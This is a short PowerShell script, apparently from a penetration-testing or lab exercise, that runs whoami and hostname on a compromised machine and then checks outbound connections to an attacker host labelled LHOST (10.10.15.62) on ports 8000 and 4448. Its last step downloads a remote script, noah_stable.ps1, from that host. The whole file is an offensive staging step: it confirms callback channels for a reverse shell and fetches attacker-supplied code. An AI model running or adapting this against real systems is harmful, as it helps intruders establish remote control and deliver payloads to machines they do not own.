whoami
hostname
$LHOST = '10.10.15.62'
try {
  $t = New-Object Net.Sockets.TcpClient
  $t.Connect($LHOST, 8000)
  'TCP8000=OK'
  $t.Close()
} catch {
  'TCP8000=FAIL ' + $_.Exception.Message
}
try {
  $t2 = New-Object Net.Sockets.TcpClient
  $t2.Connect($LHOST, 4448)
  'TCP4448=OK'
  $t2.Close()
} catch {
  'TCP4448=FAIL ' + $_.Exception.Message
}
try {
  $wc = New-Object Net.WebClient
  $s = $wc.DownloadString('http://10.10.15.62:8000/noah_stable.ps1')
  'HTTP_DL_LEN=' + $s.Length
} catch {
  'HTTP_DL_FAIL ' + $_.Exception.Message
}
